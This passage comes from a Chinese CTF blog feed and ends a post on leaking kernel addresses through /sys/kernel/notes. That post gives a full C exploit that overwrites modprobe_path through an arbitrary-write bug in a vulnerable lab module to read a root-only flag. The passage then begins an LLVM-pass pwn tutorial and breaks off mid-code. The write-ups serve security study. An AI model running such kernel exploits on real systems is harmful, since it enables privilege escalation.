MISC_DYNAMIC_MINOR, .name = <span class="string">&quot;vuln&quot;</span>, .fops = &amp;vuln_fops&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">vuln_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    pr_info(<span class="string">&quot;vuln: module init.\n&quot;</span>);</span><br><span class="line">    misc_register(&amp;vuln_miscdev);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">vuln_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    pr_info(<span class="string">&quot;vuln: module exit.\n&quot;</span>);</span><br><span class="line">    misc_deregister(&amp;vuln_miscdev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(vuln_init);</span><br><span class="line">module_exit(vuln_exit);</span><br></pre></td></tr></table></figure><p>可以看到我们有无数次任意地址写 <code>8</code> 字节的机会，假设上面泄露出来的地址是正确的，我们可以通过修改 <code>modprobe_path</code> 来获取 <code>flag</code><br>exp：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff82e8b920</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="type">size_t</span> vul;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">arb_write</span><span class="params">(<span class="type">size_t</span> addr, <span class="type">size_t</span> vul)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">thisNote</span>;</span></span><br><span class="line">    thisNote.addr = addr;</span><br><span class="line">    thisNote.vul = vul;</span><br><span class="line">    ioctl(fd, <span class="number">0</span>, &amp;thisNote);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> leak, kernel_base;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/vuln&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> note_fd = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, O_RDONLY);</span><br><span class="line">    read(note_fd, data, <span class="number">0x100</span>);</span><br><span class="line">    binary_dump(<span class="string">&quot;/sys/kernel/notes&quot;</span>, data, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;leak, &amp;data[<span class="number">0x84</span>], <span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    kernel_base = leak - <span class="number">0x22961c0</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line"></span><br><span class="line">    arb_write(modprobe_path, <span class="number">0x7465672f706d742f</span>);</span><br><span class="line">    arb_write(modprobe_path + <span class="number">8</span>, <span class="number">0x6c6c656873</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;# make fake file magic not found&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag&#x27;&gt;/tmp/getshell&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/getshell&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27;&gt;/tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;# get flag&quot;</span>);</span><br><span class="line">    <span class="type">int</span> flag_fd = open(<span class="string">&quot;/flag&quot;</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open flag failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(flag_fd, data, <span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] flag is %s\n&quot;</span>,data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下：  </p><img src="/2024/04/17/notes/2.png" class="" title="我的图图呢">  <p>显然泄露出来的内核地址是可用的。通过调试发现泄露出来的是 <code>startup_xen</code> 的地址  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_XEN_PV</span></span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_VIRT_BASE,      _ASM_PTR __START_KERNEL_map)</span><br><span class="line"><span class="comment">/* Map the p2m table to a 512GB-aligned user address. */</span></span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_INIT_P2M,       .quad (PUD_SIZE * PTRS_PER_PUD))</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_ENTRY,          _ASM_PTR startup_xen)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_FEATURES,       .ascii <span class="string">&quot;!writable_page_tables&quot;</span>)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_PAE_MODE,       .asciz <span class="string">&quot;yes&quot;</span>)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_L1_MFN_VALID,</span><br><span class="line">.quad _PAGE_PRESENT; .quad _PAGE_PRESENT)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_MOD_START_PFN,  .<span class="type">long</span> <span class="number">1</span>)</span><br><span class="line">ELFNOTE(Xen, XEN_ELFNOTE_PADDR_OFFSET,   _ASM_PTR <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>然而 <code>Cook</code> 发布了 <code>leaking_addresses.pl</code> 的补丁。它可以读取内核符号文件（例如 <code>/proc/kallsyms</code> ），并查看与这些符号关联的地址是否出现在 <code>/sys/kernel/notes</code> 这样的二进制文件中。有了此更改之后， <code>leaking_addresses.pl</code> 就会发现这种长期存在的内核地址泄露，但我感觉还是会有漏网之鱼（笑  </p><p>reference：<br><a href="https://lore.kernel.org/all/202402180028.6DB512C50@keescook/">https://lore.kernel.org/all/202402180028.6DB512C50@keescook/</a><br><a href="https://lwn.net/Articles/962782/">https://lwn.net/Articles/962782/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;通常我们对内核的攻击都是基于知道内核各种地址的前提下进行的，为了加大攻击内核的难度， &lt;code&gt;kaslr&lt;/code&gt; 由此而生，但内核会很容易泄露有关其位置的信息，如大量内核代码乐于在 &lt;code&gt;printk()&lt;/code&gt; 调用中打印出内核指针值。&lt;br&gt;在 大</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>llvm pass pwn</title>
    <link href="https://qanux.github.io/2024/03/15/llvm/"/>
    <id>https://qanux.github.io/2024/03/15/llvm/</id>
    <published>2024-03-14T16:00:00.000Z</published>
    <updated>2024-03-20T15:21:14.603Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>既然说到<code>llvm pass pwn</code>，我们肯定要先了解<code>llvm</code>到底是一个什么东西<br>学过编译原理的人应该都知道，编译过程主要可以划分为前端与后端：  </p><ul><li>前端把源代码翻译成中间表示 (<code>IR</code>)</li><li>后端把IR编译成目标平台的机器码。当然，<code>IR</code>也可以给解释器解释执行</li></ul><p>然而，经典的编译器如<code>gcc</code>在设计上都是提供一条龙服务的： 你不需要知道它使用的<code>IR</code>是什么样的，它也不会暴露中间接口来给你操作它的<code>IR</code>。 换句话说，从前端到后端，这些编译器的大量代码都是强耦合的。  </p><p>这样做有好处也有坏处。好处是，因为不需要暴露中间过程的接口，它可以在内部做任何想做的平台相关的优化。 而坏处是，每当一个新的平台出现，这些编译器都要各自为政实现一个从自己的<code>IR</code>到新平台的后端。 甚至如果当一种新语言出现，且需要实现一个新的编译器，那么可能需要设计一个新的<code>IR</code>，以及针对大部分平台实现这个<code>IR</code>的后端。 不妨想一下，如果有M种语言、<code>N</code>种目标平台，那么最坏情况下要实现 <code>M*N</code> 个前后端。这是很低效的。  </p><p>因此，我们很自然地会想，如果大家都共用一种<code>IR</code>呢？ 那么每当新增加一种语言，我们就只要添加一个这个语言到<code>IR</code>的前端； 每当新增加一种目标平台，我们就只要添加一个<code>IR</code>到这个目标平台的后端。 如果有M种语言、N种目标平台，那么最优情况下我们只要实现 <code>M+N</code> 个前后端。  </p><p>而<code>LLVM</code>就是这样一个项目。<code>LLVM</code>的核心设计了一个叫 <code>LLVM IR</code> 的中间表示， 并以库(<code>Library</code>) 的方式提供一系列接口， 为你提供诸如操作<code>IR</code>、生成目标平台代码等等后端的功能。  </p><p>那么 <code>LLVM Pass</code> 又是什么呢？ <code>Pass</code>就是“遍历一遍<code>IR</code>，可以同时对它做一些操作”的意思。翻译成中文应该叫“趟”。 在实现上，<code>LLVM</code>的核心库中会给你一些 <code>Pass</code>类 去继承。你需要实现它的一些方法。 最后使用<code>LLVM</code>的编译器会把它翻译得到的<code>IR</code>传入<code>Pass</code>里，给你遍历和修改。  </p><p>下面列出几个比较重要的命令行工具：  </p><ul><li><code>llvm-as</code>：把<code>LLVM IR</code>从人类能看懂的文本格式汇编成二进制格式。注意：此处得到的不是目标平台的机器码。</li><li><code>llvm-dis</code>：<code>llvm-as</code>的逆过程，即反汇编。 不过这里的反汇编的对象是<code>LLVM IR</code>的二进制格式，而不是机器码。</li><li><code>opt</code>：优化<code>LLVM IR</code>。输出新的<code>LLVM IR</code>。</li><li><code>llc</code>：把<code>LLVM IR</code>编译成汇编码。需要用<code>as</code>进一步得到机器码。</li><li><code>lli</code>：解释执行<code>LLVM IR</code>。</li></ul><p>下面简单聊聊<code>llvm IR</code>  </p><h2 id="何为LLVM-IR"><a href="#何为LLVM-IR" class="headerlink" title="何为LLVM IR"></a>何为LLVM IR</h2><ul><li><code>LVM IR</code> 是一门低级编程语言，语法类似于汇编</li><li>任何高级编程语言（如<code>C++</code>）都可以用 <code>LLVM IR</code> 表示</li><li>基于 <code>LLVM IR</code> 可以很方便地进行代码优化(任何编程语言都能统一转换为<code>LLVM IR</code>)</li></ul><img src="/2024/03/15/llvm/1.png" class="" title="我的图图呢">  <h2 id="LLVM-IR的两种表示方法"><a href="#LLVM-IR的两种表示方法" class="headerlink" title="LLVM IR的两种表示方法"></a>LLVM IR的两种表示方法</h2><ul><li>人类可以阅读的文本形式，文件后缀为 <code>.ll</code></li><li>易于机器处理的二进制格式，文件后缀为 <code>.bc</code></li></ul><p>下面给出一些常用的指令：  </p><ul><li>.c -&gt; .ll：clang -emit-llvm -S exp.c -o exp.ll</li><li>.c -&gt; .bc: clang -emit-llvm -c exp.c -o exp.bc</li><li>.ll -&gt; .bc: llvm-as a.ll -o exp.bc</li><li>.bc -&gt; .ll: llvm-dis a.bc -o exp.ll</li><li>.bc -&gt; .s: llc exp.bc -o exp.s</li></ul><p>下面来分析官方文档中一个入门级别的<code>llvm pass</code>程序：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">        <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">        <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123; <span class="comment">// 重写runOnFunction，使得每遍历到一个函数时就输出函数名</span></span><br><span class="line">            <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">            <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;; <span class="comment">// end of struct Hello</span></span><br><span class="line">&#125;  <span class="comment">// end of anonymous namespace</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>, <span class="comment">// 使用 RegisterPass 宏注册 Hello Pass。这允许它通过命令行参数传递给LLVM工具</span></span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="literal">false</span> <span class="comment">/* Only looks at CFG */</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                             <span class="literal">false</span> <span class="comment">/* Analysis Pass */</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>这段代码的主要内容是注册了一个<code>Hello</code>函数，重写了<code>runOnFunction</code>函数，使得每遍历到一个函数时就输出函数名。  </p><p>一般来说，在<code>pwn</code>题中，漏洞主要来自于<code>so</code>文件中，而漏洞多产生于重写了<code>so</code>文件中的<code>runOnFunction</code>函数，我们可以通过在<code>ida</code>中搜索<code>vtable</code>来定位这一个函数，而我们要攻击的则是<code>opt</code>这个<code>elf</code>文件<br>至于<code>PASS</code>注册的名称，一般会在<code>README</code>文件中给出，若是没有给出，可通过对<code>__cxa_atexit</code>函数“交叉引用”来定位  </p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载常见的<code>clang</code>和<code>llvm</code>版本  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install clang-8</span><br><span class="line">sudo apt install llvm-8</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-10</span><br><span class="line">sudo apt install llvm-10</span><br><span class="line"> </span><br><span class="line">sudo apt install clang-12</span><br><span class="line">sudo apt install llvm-12</span><br></pre></td></tr></table></figure><p>其中<code>opt</code>是<code>LLVM</code>的优化器和分析器，可加载指定的模块，对输入的<code>LLVM IR</code>或者<code>LLVM</code>字节码进行优化或分析。<code>CTF</code>题目一般会给出所需版本的<code>opt</code>文件（可用<code>./opt --version</code>查看版本）或者在<code>README</code>文档中告知<code>opt</code>版本。安装好<code>llvm</code>后，可在<code>/usr/lib/llvm-xx/bin/opt</code>路径下找到对应<code>llvm</code>版本的<code>opt</code>文件（一般不开<code>PIE</code>保护）  </p><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb opt-8</span><br><span class="line">set args -load ./yaka.so -ayaka ./exp.ll</span><br><span class="line">b main</span><br><span class="line">r</span><br></pre></td></tr></table></figure><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="红帽杯-2021-simpleVM"><a href="#红帽杯-2021-simpleVM" class="headerlink" title="[红帽杯 2021] simpleVM"></a>[红帽杯 2021] simpleVM</h2><p>好习惯，上来先给<code>opt-8</code>来一发<code>checksec</code>  </p><img src="/2024/03/15/llvm/2.png" class="" title="我的图图呢">  <p>可以发现程序并没有开启<code>PIE</code>保护而且<code>got</code>表可改<br>将<code>VMPass.so</code>拖进<code>ida</code>，漏洞通常都在这一个<code>so</code>文件中<br>我们首先看<code>start</code>函数：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;VMPass&quot;</span> )</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(<span class="string">&quot;VMPass&quot;</span>);</span><br><span 